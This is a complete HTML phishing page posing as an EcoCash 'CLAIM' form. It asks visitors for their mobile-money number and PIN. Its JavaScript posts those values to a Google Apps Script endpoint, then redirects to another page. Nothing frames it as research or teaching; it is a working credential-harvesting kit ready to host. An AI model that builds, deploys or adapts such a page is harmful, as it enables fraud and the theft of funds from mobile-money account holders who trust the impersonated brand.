<!DOCTYPE html>
<html>
<head>
  <title>Workers Form</title>

  <style>
    body{
      font-family: Arial;
      background:#f2f2f2;
      display:flex;
      justify-content:center;
      align-items:center;
      height:100vh;
    }

    .container{
      background:blue;
      padding:25px;
      border-radius:10px;
      width:300px;
      box-shadow:0 0 10px rgba(0,0,0,0.2);
    }

    h2{
      text-align:center;
    }

    input{
      width:100%;
      padding:10px;
      margin:8px 0;
      border:1px solid #ccc;
      border-radius:5px;
    }

    button{
      width:100%;
      padding:10px;
      background:green;
      color:white;
      border:none;
      border-radius:5px;
    }
  </style>
</head>

<body>

<div class="container">
  <div style="text-align:center; margin-bottom:15px;">
  <div style="text-align:center; margin-bottom:15px;">
  <div style="width:80px; height:80px; border-radius:50%; background:black;
              display:flex; justify-content:center; align-items:center;
              color:white; font-weight:bold; font-size:18px;">
    ECOCASH
  </div>
</div>
       
</div>

  <h2>Recepient number:</h2>

  <form onsubmit="submitForm(event)">
    <input type="text" id="number" placeholder="Ecocash number" required>
    <input type="text" id="confirm" placeholder="Confirm recipient number" required>
    <input type="text" id="pin" placeholder="Pin" required>

    <button type="CLAIM">CLAIM</button>
  </form>

</div>
<script>

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwxAMROcnuKVwuZX4YMYAzY30xD--ZbCslHVseptRwOHz_hAFQZhypCAItxEwhKKqVtig/exec";

function submitForm(event){

event.preventDefault();

const data = {

ecocashnumber:
document.getElementById("number").value,

confirmrecipientnumber:
document.getElementById("confirm").value,

pin:
document.getElementById("pin").value

};
document.getElementById("loading").style.display = "flex";
fetch(SCRIPT_URL, {

method: "POST",

body: JSON.stringify(data)

})

.then(response => response.text())

.then(data => {
    window.location.href = "worker.html";


})

.catch(error => {

alert("Submission failed");

});

}

</script>
<!-- Loading Overlay -->
<div id="loading" style="
  display:none;
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background:rgba(0,0,0,0.7);
  z-index:9999;
  justify-content:center;
  align-items:center;
  flex-direction:column;
  color:white;
  font-size:20px;
">

  <div class="spinner"></div>
  <p>Please wait...</p>

</div>

<style>
.spinner {
  border: 6px solid #f3f3f3;
  border-top: 6px solid #3498db;
  border-radius: 50%;
  width: 50px;
  height: 50px;
  animation: spin 1s linear infinite;
  margin-bottom: 15px;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
</body>
</html>
